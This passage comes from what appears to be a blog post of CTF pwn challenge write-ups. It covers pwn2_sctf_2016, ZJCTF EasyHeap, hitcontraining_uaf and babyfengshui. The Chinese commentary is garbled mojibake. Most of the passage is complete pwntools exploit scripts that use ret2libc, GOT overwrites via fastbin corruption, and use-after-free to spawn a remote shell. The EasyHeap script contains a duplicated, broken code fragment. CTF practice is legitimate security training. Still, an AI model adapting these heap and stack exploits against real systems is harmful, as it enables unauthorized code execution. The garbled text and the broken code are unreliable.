class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27335</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn2_sctf_2016&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>s=<span class="hljs-number">0x080486f8</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(s)+p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>printf=u32(r.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf)<br>base=printf-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br><span class="hljs-comment">#------------------------------------------------------------</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(binsh)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h3><p>è¿™é¢˜gotè¡¨å¯å†™ï¼Œpieä¹Ÿæ²¡å¼€ï¼Œæ²¡showå‡½æ•°ï¼Œè€ƒè™‘gotåŠ«æŒã€‚</p><p>é¦–å…ˆé¢˜ç›®ä¸­é‚£ä¸ªå‡½æ•°ç›®å½•é”™äº†ï¼Œcatä¸äº†flagã€‚</p><p>æ€è·¯ï¼šå †æº¢å‡ºï¼Œåˆ†é…chunkåˆ°magicåœ°å€é™„è¿‘ï¼Œå› ä¸ºè¿™é¢˜magicåœ¨heaparrayé™„è¿‘ï¼Œè€ŒheaparrayæŒ‡å‘chunkï¼Œæº¢å‡ºè¦†ç›–ä½¿å…¶æŒ‡å‘free_gotï¼Œè€Œè¯¥chunkåˆ™æ”¹ä¸ºsystem_pltï¼Œå¾®è°ƒä½ç½®ï¼Œsizeå¤§å°0x7fç»•è¿‡fastbinçš„æ£€æµ‹ã€‚</p><p>æ”¹å†™ä¸€ä¸ªchunkå†™æˆbinshã€‚</p><p>freeæœ‰binshçš„é‚£ä¸ªå—ï¼ŒæŠŠbinshä½œä¸ºå‚æ•°å¸¦ç»™freeï¼ˆå…¶å®æ˜¯systemï¼‰</p><p>æœ€åçš„æ•ˆæœæ˜¯ï¼š</p><p>freeï¼ˆ1ï¼‰ï¼Œå®é™…æ˜¯systemï¼ˆ/bin/shï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br><br>sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>magic=<span class="hljs-number">0x06020C0</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index1</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index2</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)+p64(magic-<span class="hljs-number">0x13</span>))<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)     <span class="hljs-comment">#index3</span><br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>åœ¨heaparrayé‡Œå¡«free_gotå’Œchunk0ä¸­å¡«system_pltæ€ä¹ˆè”ç³»èµ·æ¥çš„ï¼Œå¦‚ä½•åŠ«æŒgotçš„ï¼š</strong></p><p>â€‹                å¡«å…¥free_gotè¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œè¦†ç›–äº†chunk0çš„åœ°å€ï¼Œchunk0çš„åœ°å€é‚£é‡Œå†™å…¥äº†free_gotçš„åœ°å€</p><p>ç„¶åå†å»edit chunk0ï¼Œå°±ç­‰äºedit free_gotï¼Œç„¶åæ”¹æˆsystem</p><h3 id="hitcontraining-uaf">hitcontraining_uaf</h3><p>è¿™é¢˜å †é‡Šæ”¾åæŒ‡é’ˆå¹¶æœªæ¸…ç©ºï¼Œå†æ¬¡ç”³è¯·åŸæœ¬print_note_contentçš„å˜æˆäº†shellå‡½æ•°ï¼Œä¸»è¦è¿™é¢˜printå‡½æ•°è¿˜ç”¨è°ƒç”¨è‡ªèº«æ¥putã€‚</p><p>åé¢ç”³è¯·8ä¸ªå­—èŠ‚ï¼Œæ˜¯æŠŠnote0çš„fdæ”¹å†™æˆäº†magicå‡½æ•°åœ°å€ï¼Œåº”ä¸ºnote1çš„bkæŒ‡å‘note0çš„fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28547</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content_size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(content_size))<br>        sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------------------------</span><br>magic=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,p32(magic))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016ï¼š">babyfengshui_33c3_2016ï¼š</h3><p>åˆ©ç”¨é¢˜ç›®ä¸­çš„ç»“æ„ï¼Œç»•è¿‡é•¿åº¦æ£€æµ‹æœºåˆ¶ï¼Œå †æº¢å‡ºä½¿ä¸­é—´ä¸€ä¸ªå †çš„prevsizeå¡«ä¸Šfreeçš„gotè¡¨åœ°å€ï¼Œåˆ©ç”¨showå‡½æ•°æ³„éœ²freeå®é™…åœ°å€ï¼Œå¯å¾—çŸ¥libcåŸºå€ï¼Œsystemã€‚åˆ©ç”¨æœºåˆ¶ç»•è¿‡é•¿åº¦æ£€æµ‹ï¼Œå¯ç”¨updateå‡½æ•°ï¼ŒæŠŠfreegotè¡¨åœ°å€æ”¹å†™æˆsystemï¼Œæœ€åå†freeæœ‰binshçš„é‚£ä¸ªå—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br><br>local_file  = <span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br><br>select = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29328</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,length,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size of description: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(text)))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,<span class="hljs-number">4</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>free_addr=(u32(rc(<span class="hljs-number">4</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_addr)<br>base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>update(<span class="hljs-number">1</span>,p32(sys))<br>delete(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-orw">pwnable_orw</h3><p>è¿™é¢˜æœ‰orw_seccomp()é™åˆ¶ï¼Œä½†æ²¡å¼€NXï¼Œè€Œä¸”é¢˜ç›®ç›´æ¥ç»™å¥½æ 